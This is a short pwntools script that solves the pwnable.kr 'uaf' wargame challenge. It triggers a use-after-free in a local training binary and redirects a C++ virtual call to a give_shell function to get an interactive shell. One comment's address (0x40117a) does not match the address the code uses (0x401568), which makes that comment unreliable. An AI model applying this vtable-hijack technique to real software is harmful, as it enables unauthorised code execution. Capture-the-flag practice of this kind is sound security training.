from pwn import *
give_shell = 0x401568
# s = ssh(host='pwnable.kr', port=2222,
#         user='uaf', password='guest')
f = open("input", "wb")
f.write(p64(give_shell))
f.close()
p = process(["./uaf", "8", "input"])
#gdb.attach(p)
# 1. free the objects
# 2. overwrite where their virtual function introduce() is with
# address of giveShell 0x40117a
# We got the address by selecting option 1
# and breaking and inspecting rax register
# the is the address of vptr (which stores the address of the vtable)
p.send(b'3\n2\n2\n1\n')
#p.clean()
p.interactive()